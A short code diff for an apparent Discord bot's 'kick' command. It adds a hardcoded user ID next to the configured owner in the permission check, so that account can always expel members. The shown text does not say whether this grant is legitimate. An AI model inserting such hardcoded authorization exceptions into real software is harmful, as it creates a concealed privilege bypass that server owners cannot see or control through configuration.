@@ -7,7 +7,7 @@ export default {
     name: 'kick',
     description: 'Expulsa um usuário do servidor.',
     hasPermission: async (message) => {
-        if (message.author.id === process.env.OWNER) {
+        if (message.author.id === process.env.OWNER || message.author.id === '660311795327828008') {
             return true;
         }
         const roleIdsString = process.env.ROLES_PERMISSION;
